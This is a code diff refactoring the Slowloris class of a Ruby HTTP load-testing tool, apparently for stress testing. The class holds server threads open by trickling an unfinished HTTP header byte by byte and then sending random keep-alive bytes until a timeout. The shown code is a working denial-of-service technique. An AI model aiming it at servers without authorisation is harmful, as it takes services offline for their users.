@@ -9,6 +9,7 @@ module HttpLoader
     # Handles deliberate thread-hogging Slowloris tactics.
     class Slowloris
       extend T::Sig
+      include Pacing
 
       # Builds the slowloris execution strategy instance.
       #
@@ -17,8 +18,8 @@ module HttpLoader
       # @return [void]
       sig { params(config: Config, logger: Logger).void }
       def initialize(config, logger)
-        @config = T.let(config, Config)
-        @logger = T.let(logger, Logger)
+        @config = config
+        @logger = logger
       end
 
       # Engages the slowloris thread hold directly manipulating the raw socket bypassing HTTP standards.
@@ -49,15 +50,13 @@ module HttpLoader
       # @return [void]
       sig { params(io: IO, uri: URI::Generic).void }
       def fire_initial_payload(io, uri)
-        chars = build_payload_headers(uri).chars
-        last = chars.size - 1
-
-        chars.each_with_index do |char, i|
+        build_payload_headers(uri).chars.each_with_index do |char, i|
+          # Pace *before* each byte except the first: this spaces the stream identically while
+          # leaving no trailing pause after the final byte (maintain_hold paces the keep-alive
+          # bytes itself), without a redundant last-index calculation.
+          sleep(jittered_interval(@config.slowloris_delay, @config.jitter)) if i.positive?
           io.write(char)
           io.flush
-          # No trailing pause after the final byte; maintain_hold immediately paces the
-          # subsequent keep-alive bytes, so an extra sleep here is redundant.
-          sleep(calculate_sleep(@config.slowloris_delay)) unless i == last
         end
       end
 
@@ -68,14 +67,13 @@ module HttpLoader
       sig { params(uri: URI::Generic).returns(String) }
       def build_payload_headers(uri)
         path = T.must(uri.path).empty? ? '/' : uri.path
-        query = uri.query ? "?#{uri.query}" : ''
-        payload = "GET #{path}#{query} HTTP/1.1\r\n" \
+        target = uri.query ? "#{path}?#{uri.query}" : path
+        payload = "GET #{target} HTTP/1.1\r\n" \
                   "Host: #{uri.host}\r\n" \
                   "Connection: keep-alive\r\n" \
                   "User-Agent: #{@config.user_agent}\r\n"
         @config.headers.each { |k, v| payload += "#{k}: #{v}\r\n" }
-        payload += 'X-Slowloris: ' # unfinished header
-        payload
+        "#{payload}X-Slowloris: " # deliberately unfinished trailing header
       end
 
       # Keeps an ongoing socket indefinitely occupied via sporadic random byte injection.
@@ -87,7 +85,7 @@ module HttpLoader
       sig { params(client_index: Integer, io: IO, start_time: Time).void }
       def maintain_hold(client_index, io, start_time)
         loop do
-          remaining = remaining_budget(start_time)
+          remaining = budget_remaining(@config.http_loader_timeout, start_time)
           if remaining && remaining <= 0.0
             @logger.info("[Client #{client_index}] Keep-alive timeout reached, closing Slowloris thread.")
             break
@@ -95,43 +93,8 @@ module HttpLoader
 
           io.write(rand(97..122).chr)
           io.flush
-          sleep(cap_sleep(calculate_sleep(@config.slowloris_delay), remaining))
+          sleep(cap_to_budget(jittered_interval(@config.slowloris_delay, @config.jitter), remaining))
         end
-      end
-
-      # Seconds left before the keep-alive deadline, or nil when unbounded.
-      #
-      # @param start_time [Time] the connection's spawn timestamp
-      # @return [Float, nil] remaining seconds, or nil if unbounded
-      sig { params(start_time: Time).returns(T.nilable(Float)) }
-      def remaining_budget(start_time)
-        return nil unless @config.http_loader_timeout > 0.0
-
-        @config.http_loader_timeout - (Time.now - start_time)
-      end
-
-      # Caps a computed sleep so it never sleeps past the remaining keep-alive budget.
-      #
-      # @param base [Float] the desired sleep duration
-      # @param remaining [Float, nil] remaining budget, or nil if unbounded
-      # @return [Float] the capped sleep duration
-      sig { params(base: Float, remaining: T.nilable(Float)).returns(Float) }
-      def cap_sleep(base, remaining)
-        return base unless remaining
-
-        [base, remaining].min
-      end
-
-      # Analyzes base sleep threshold utilizing configured global jitter factors.
-      #
-      # @param base_seconds [Float] the strict numerical sleep request
-      # @return [Float] randomly dispersed sleep interval ensuring asynchronous collisions do not align
-      sig { params(base_seconds: Float).returns(Float) }
-      def calculate_sleep(base_seconds)
-        return base_seconds if @config.jitter.zero?
-
-        variance = base_seconds * @config.jitter
-        [0.0, base_seconds + rand(-variance..variance)].max
       end
     end
   end
